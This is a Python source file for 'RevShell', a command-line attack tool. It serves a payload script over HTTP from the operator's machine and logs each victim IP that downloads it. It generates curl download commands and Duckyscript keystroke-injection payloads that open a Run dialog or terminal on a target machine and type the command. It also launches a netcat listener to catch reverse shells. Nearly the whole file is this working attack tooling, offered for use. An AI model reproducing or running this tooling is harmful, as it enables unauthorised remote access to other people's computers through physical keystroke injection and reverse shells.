import http.server
import socketserver
import os
import socket
import platform
import time
import threading
from colorama import init, Fore
import subprocess
import shutil
import signal

# Set a PID for the netcat listener
listener_pid = None

# Initialize colorama
init(autoreset=True)

# Port on which the server will run
PORT = 8000

# Path to the script.sh file
SCRIPT_PATH = "script.sh"

# Path to the log file
LOG_FILE = "access_log.txt"

# Path to the duckyscript file
DUCKYSCRIPT_PATH = "duckyscript.txt"

# ASCII Art
ascii_art = f"""{Fore.CYAN}
 ____            ____                          
|  _ \ _____   _/ ___|  ___ _ ____   _____ _ __ 
| |_) / _ \ \ / \___ \ / _ \ '__\ \ / / _ \ '__|
|  _ <  __/\ V /  ___) |  __/ |   \ V /  __/ |  
|_| \_\___| \_/ |____/ \___|_|    \_/ \___|_|   

             {Fore.GREEN}Made by SnapBanane
"""

server = None
server_thread = None
listener_process = None

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def generate_curl_command(os_type):
    local_ip = get_local_ip()
    if os_type == "windows":
        return f'curl.exe http://{local_ip}:{PORT}/{SCRIPT_PATH} -o {SCRIPT_PATH}'
    else:  # Ubuntu
        return f'curl http://{local_ip}:{PORT}/{SCRIPT_PATH} -o {SCRIPT_PATH}'

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == f'/{SCRIPT_PATH}':
            client_ip = self.client_address[0]
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            with open(LOG_FILE, 'a') as log:
                log.write(f"{timestamp} - IP: {client_ip} downloaded {SCRIPT_PATH}\n")
            print(f"\n{Fore.YELLOW}[+] {timestamp} - IP: {client_ip} downloaded {SCRIPT_PATH}")
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

def start_server():
    global server, server_thread
    server = socketserver.TCPServer(("", PORT), CustomHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.start()
    print(f"{Fore.GREEN}Server started on port {PORT}")

def stop_server():
    global server, server_thread
    if server:
        server.shutdown()
        server.server_close()
        server_thread.join()
        print(f"{Fore.RED}Server stopped")
    else:
        print(f"{Fore.YELLOW}Server is not running")

def help_command():
    print(f"{Fore.CYAN}Available commands:")
    print(f"{Fore.GREEN}  help              - Show this help message")
    print(f"{Fore.GREEN}  generate os=<os>  - Generate curl command (options: windows, ubuntu)")
    print(f"{Fore.GREEN}  generate os=<os> ducky - Generate Duckyscript with curl command")
    print(f"{Fore.GREEN}  listen port=<port> - Start a netcat listener on the specified port")
    print(f"{Fore.GREEN}  listen stop       - Stop the netcat listener")
    print(f"{Fore.GREEN}  server start      - Start the server")
    print(f"{Fore.GREEN}  server stop       - Stop the server")
    print(f"{Fore.GREEN}  clear             - Clear the screen")
    print(f"{Fore.GREEN}  exit              - Exit the program")

def generate_ducky_script(curl_command, os_type):
    # Write the curl command to duckyscript.txt
    with open(DUCKYSCRIPT_PATH, 'w') as ducky_file:
        ducky_file.write(f"DELAY 500\n")
        
        if os_type == "windows": # Windows
            ducky_file.write(f"GUI r\n")  # Open Run dialog
            ducky_file.write(f"DELAY 500\n")
            ducky_file.write(f"STRING cmd /c {curl_command}\n")  # Execute the curl command directly
            ducky_file.write(f"ENTER\n")
        else:  # Ubuntu
       	    ducky_file.write(f"WINDOWS\n")
            ducky_file.write(f"DELAY 500\n")
            ducky_file.write(f"ENTER\n")
            ducky_file.write(f"DELAY 500\n")
            ducky_file.write(f"STRING '{curl_command}'\n")  # Execute the curl command
            ducky_file.write(f"ENTER\n")

    print(f"{Fore.GREEN}Duckyscript generated in {DUCKYSCRIPT_PATH}.")

def start_listener(port):

    global listener_pid

    # Ensure the script is running on Linux
    if platform.system().lower() != 'linux':
        raise EnvironmentError("This script is intended for Linux only.")

    # Command to open Terminator with netcat in a detached window, suppressing output
    command = f'terminator -e "bash -c \'nc -lvnp {port}\'" > /dev/null 2>&1 &'

    # Open the netcat listener in a new window
    try:
        print(f"Starting netcat listener on port {port}...")
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
        listener_pid = process.pid  # Store the PID of the listener
        print("Netcat listener started in a new terminal window.")
    except Exception as e:
        print(f"An error occurred: {e}")
        
def stop_listener():
    """
    Stops the netcat listener if it is running.
    """
    global listener_pid
    if listener_pid:
        try:
            os.killpg(listener_pid, signal.SIGTERM)  # Terminate the process group
            listener_pid = None
            print("Netcat listener has been stopped.")
        except Exception as e:
            print(f"Failed to stop the listener: {e}")
    else:
        print("No netcat listener is running.")

def main():
    clear_screen()
    print(ascii_art)
    
    while True:
        command = input(f"{Fore.BLUE}RevShell > {Fore.RESET}").strip().lower()
        
        if command == "help":
            help_command()
        elif command.startswith("generate os="):
            parts = command.split()
            os_type = parts[1].split('=')[-1]  # Get the OS type from the second part
            if os_type in ["windows", "ubuntu"]:
                curl_command = generate_curl_command(os_type)
                print(f"\n{Fore.CYAN}Generated command:")
                print(f"{Fore.YELLOW}=" * 60)
                print(f"{Fore.GREEN}{curl_command}")
                print(f"{Fore.YELLOW}=" * 60)

                # Check for ducky option
                if len(parts) > 2 and "ducky" in parts:
                    generate_ducky_script(curl_command, os_type)
            else:
                print(f"{Fore.RED}Invalid OS type. Use 'os=windows' or 'os=ubuntu'.")
        elif command.startswith("listen port="):
            port = command.split('=')[-1].strip()
            if port.isdigit():
                start_listener(port)
            else:
                print(f"{Fore.RED}Invalid port number. Please enter a valid port.")
        elif command == "listen stop":
            stop_listener()
        elif command == "server start":
            start_server()
        elif command == "server stop":
            stop_server()
        elif command == "clear":
            clear_screen()
            print(ascii_art)
        elif command == "exit":
            if server:
                stop_server()
            stop_listener()  # Ensure listener is stopped on exit
            print(f"{Fore.YELLOW}Exiting RevShell. Goodbye!")
            break
        else:
            print(f"{Fore.RED}Unknown command. Type 'help' for available commands.")

if __name__ == "__main__":
    # Clear the log file at the start
    open(LOG_FILE, 'w').close()

    # Check if the file exists
    if not os.path.exists(SCRIPT_PATH):
        print(f"{Fore.RED}Error: The file '{SCRIPT_PATH}' does not exist.")
        print(f"{Fore.YELLOW}Please make sure the file is present in the same directory as this script.")
        exit(1)

    main()
